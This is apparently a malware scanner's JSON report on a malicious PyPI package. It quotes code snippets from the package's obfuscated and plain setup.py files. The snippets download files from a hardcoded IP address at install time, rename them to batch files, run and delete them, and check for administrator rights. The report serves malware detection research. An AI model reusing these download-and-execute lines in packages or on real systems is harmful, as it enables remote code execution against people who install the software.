{
  "package_name": "6c15bb3d0213e9ef73147a71dfa58592df11078d",
  "total_matches": 20,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/6c15bb3d0213e9ef73147a71dfa58592df11078d/obfuscated/setup.py",
      "file_name": "setup.py",
      "detection_count": 10,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "This code exhibits multiple critical indicators of malicious behavior, consistent with known malware and supply chain attack patterns. Specifically: (1) It downloads files from hardcoded, suspicious IP addresses (http://52.14.229.35:1122/connect-CANDC.txt and http://52.14.229.35:1122/shoomsha.jpg), which are not associated with any legitimate software distribution. (2) The downloaded files are written to disk and then immediately executed as batch files via shell commands (cmd /c local.bat, cmd /c loc.bat), enabling arbitrary code execution from an untrusted remote source. (3) The code attempts to install the 'requests' library if missing, ensuring its own dependencies for network communication are met, which is a common malware tactic for reliability. (4) There is obfuscation via non-descriptive variable names and indirect subprocess usage, and all operations are wrapped in broad try/except blocks to suppress errors and evade detection. (5) The code is embedded in what appears to be a setup or install script, meaning it will execute automatically during package installation, a hallmark of supply chain attacks. (6) There is no user notification, consent, or legitimate business logic for these actions. (7) The code attempts to escalate privileges by checking for administrative access (via 'net session') and provides misleading error messages to encourage the user to rerun with higher privileges. All these behaviors are strongly associated with malware and are never observed in benign software.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "82",
          "type_description": "shady-links: found 4 source code matches",
          "code_snippet": "wJBCeKkfTzmzLJOJSvpZjSUoMmUnmfbu = 'http://52.14.229.35:1122/connect-CANDC.txt'",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at obfuscated/setup.py:82",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/6c15bb3d0213e9ef73147a71dfa58592df11078d/obfuscated/setup.py",
          "relative_path": "obfuscated/setup.py"
        },
        {
          "line_number": "107",
          "type_description": "shady-links: found 4 source code matches",
          "code_snippet": "wJBCeKkfTzmzLJOJSvpZjSUoMmUnmfbu = 'http://52.14.229.35:1122/shoomsha.jpg'",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at obfuscated/setup.py:107",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/6c15bb3d0213e9ef73147a71dfa58592df11078d/obfuscated/setup.py",
          "relative_path": "obfuscated/setup.py"
        },
        {
          "line_number": "69",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "WXeqsAZqkXYNwKeELrVXuScCXbJMRsvS = subprocess.Popen('echo %temp%', shell=True, jzfgWzMGWNViRTqVrENtYcExZtxblzbt=subprocess.\nisPmPzKfIsmSsuGMWEENiNAfEwFhEZRN, pxQBTZuHpIMnLlvlzEAqJkuquVpCguWH=subprocess.isPmPzKfIsmSsuGMWE...EwFhEZRN)",
          "full_match": "* This package is executing OS commands in the setup.py file at obfuscated/setup.py:69",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/6c15bb3d0213e9ef73147a71dfa58592df11078d/obfuscated/setup.py",
          "relative_path": "obfuscated/setup.py"
        },
        {
          "line_number": "87",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c move local_copy.txt local.bat', shell=True,\njzfgWzMGWNViRTqVrENtYcExZtxblzbt=subprocess.isPmPzKfIsmSsuGMWEENiNAfEwFhEZRN, pxQBTZuHpIMnLlvlzEAqJkuquVpCguWH=subprocess.isPmPzKfIsmSsuGMWEENiNAfEwFhE...EwFhEZRN)",
          "full_match": "* This package is executing OS commands in the setup.py file at obfuscated/setup.py:87",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/6c15bb3d0213e9ef73147a71dfa58592df11078d/obfuscated/setup.py",
          "relative_path": "obfuscated/setup.py"
        },
        {
          "line_number": "90",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c local.bat', shell=True, jzfgWzMGWNViRTqVrENtYcExZtxblzbt=subprocess.\nisPmPzKfIsmSsuGMWEENiNAfEwFhEZRN, pxQBTZuHpIMnLlvlzEAqJkuquVpCguWH=subprocess.isPmPzKfIsmSsuGMWEENiNAfEwFhEZRN, stderr=subproc...EwFhEZRN)",
          "full_match": "* This package is executing OS commands in the setup.py file at obfuscated/setup.py:90",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/6c15bb3d0213e9ef73147a71dfa58592df11078d/obfuscated/setup.py",
          "relative_path": "obfuscated/setup.py"
        },
        {
          "line_number": "94",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c del local.bat', shell=True, jzfgWzMGWNViRTqVrENtYcExZtxblzbt=\nsubprocess.isPmPzKfIsmSsuGMWEENiNAfEwFhEZRN, pxQBTZuHpIMnLlvlzEAqJkuquVpCguWH=subprocess.isPmPzKfIsmSsuGMWEENiNAfEwFhEZRN, st...        )",
          "full_match": "* This package is executing OS commands in the setup.py file at obfuscated/setup.py:94",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/6c15bb3d0213e9ef73147a71dfa58592df11078d/obfuscated/setup.py",
          "relative_path": "obfuscated/setup.py"
        },
        {
          "line_number": "99",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "WXeqsAZqkXYNwKeELrVXuScCXbJMRsvS = subprocess.Popen('net session', shell=True, jzfgWzMGWNViRTqVrENtYcExZtxblzbt=subprocess.\nisPmPzKfIsmSsuGMWEENiNAfEwFhEZRN, pxQBTZuHpIMnLlvlzEAqJkuquVpCguWH=subprocess.isPmPzKfIsmSsuGMWE...EwFhEZRN)",
          "full_match": "* This package is executing OS commands in the setup.py file at obfuscated/setup.py:99",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/6c15bb3d0213e9ef73147a71dfa58592df11078d/obfuscated/setup.py",
          "relative_path": "obfuscated/setup.py"
        },
        {
          "line_number": "112",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c move local_b.txt loc.bat', shell=True,\njzfgWzMGWNViRTqVrENtYcExZtxblzbt=subprocess.isPmPzKfIsmSsuGMWEENiNAfEwFhEZRN, pxQBTZuHpIMnLlvlzEAqJkuquVpCguWH=subprocess.isPmPzKfIsmSsuGMWEENiNAfEw...EwFhEZRN)",
          "full_match": "* This package is executing OS commands in the setup.py file at obfuscated/setup.py:112",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/6c15bb3d0213e9ef73147a71dfa58592df11078d/obfuscated/setup.py",
          "relative_path": "obfuscated/setup.py"
        },
        {
          "line_number": "115",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c loc.bat', shell=True, jzfgWzMGWNViRTqVrENtYcExZtxblzbt=subprocess\n.isPmPzKfIsmSsuGMWEENiNAfEwFhEZRN, pxQBTZuHpIMnLlvlzEAqJkuquVpCguWH=subprocess.isPmPzKfIsmSsuGMWEENiNAfEwFhEZRN, stderr=s...EwFhEZRN)",
          "full_match": "* This package is executing OS commands in the setup.py file at obfuscated/setup.py:115",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/6c15bb3d0213e9ef73147a71dfa58592df11078d/obfuscated/setup.py",
          "relative_path": "obfuscated/setup.py"
        },
        {
          "line_number": "119",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c del loc.bat', shell=True, jzfgWzMGWNViRTqVrENtYcExZtxblzbt=\nsubprocess.isPmPzKfIsmSsuGMWEENiNAfEwFhEZRN, pxQBTZuHpIMnLlvlzEAqJkuquVpCguWH=subprocess.isPmPzKfIsmSsuGMWEENiNAfEwFhEZ...EwFhEZRN)",
          "full_match": "* This package is executing OS commands in the setup.py file at obfuscated/setup.py:119",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/6c15bb3d0213e9ef73147a71dfa58592df11078d/obfuscated/setup.py",
          "relative_path": "obfuscated/setup.py"
        }
      ]
    },
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/6c15bb3d0213e9ef73147a71dfa58592df11078d/setup.py",
      "file_name": "setup.py",
      "detection_count": 10,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "This code exhibits multiple, critical indicators of malicious behavior. It is embedded in a setup.py-like script, meaning it will execute during package installation (a hallmark of supply chain attacks). The code, when running on Windows, downloads files from hardcoded, suspicious IP addresses (http://52.14.229.35:1122/connect-CANDC.txt and http://52.14.229.35:1122/shoomsha.jpg), writes them to disk, and then executes them as batch files via subprocess.Popen. This enables remote code execution, as the content of these files is controlled by the remote server. The code also attempts to install the 'requests' library if missing, ensuring its own network functionality. It uses try/except blocks to suppress errors, further hiding its activity. The use of generic file names (local_copy.txt, local.bat, loc.bat), lack of user notification, and execution of downloaded content are all strong indicators of malware. The code also checks for administrative privileges (via 'net session'), which is a common technique for privilege escalation or to ensure successful payload execution. All these behaviors are exclusively observed in malware samples and are never justified in benign software, especially in the context of a package installation script.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "100",
          "type_description": "shady-links: found 4 source code matches",
          "code_snippet": "remote_url = 'http://52.14.229.35:1122/connect-CANDC.txt'",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at setup.py:100",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/6c15bb3d0213e9ef73147a71dfa58592df11078d/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "125",
          "type_description": "shady-links: found 4 source code matches",
          "code_snippet": "remote_url = 'http://52.14.229.35:1122/shoomsha.jpg'",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at setup.py:125",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/6c15bb3d0213e9ef73147a71dfa58592df11078d/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "87",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "a = subprocess.Popen('echo %temp%', shell=True, stdin=subprocess.\nPIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:87",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/6c15bb3d0213e9ef73147a71dfa58592df11078d/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "105",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c move local_copy.txt local.bat', shell=True,\nstdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=\nsubprocess.PIPE)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:105",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/6c15bb3d0213e9ef73147a71dfa58592df11078d/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "108",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c local.bat', shell=True, stdin=subprocess.\nPIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:108",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/6c15bb3d0213e9ef73147a71dfa58592df11078d/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "112",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c del local.bat', shell=True, stdin=\nsubprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE\n)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:112",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/6c15bb3d0213e9ef73147a71dfa58592df11078d/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "117",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "a = subprocess.Popen('net session', shell=True, stdin=subprocess.\nPIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:117",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/6c15bb3d0213e9ef73147a71dfa58592df11078d/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "130",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c move local_b.txt loc.bat', shell=True,\nstdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=\nsubprocess.PIPE)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:130",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/6c15bb3d0213e9ef73147a71dfa58592df11078d/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "133",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c loc.bat', shell=True, stdin=subprocess\n.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:133",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/6c15bb3d0213e9ef73147a71dfa58592df11078d/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "137",
          "type_description": "code-execution: found 16 source code matches",
          "code_snippet": "subprocess.Popen('cmd /c del loc.bat', shell=True, stdin=\nsubprocess.PIPE, stdout=subprocess.PIPE, stderr=\nsubprocess.PIPE)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:137",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/6c15bb3d0213e9ef73147a71dfa58592df11078d/setup.py",
          "relative_path": "setup.py"
        }
      ]
    }
  ]
}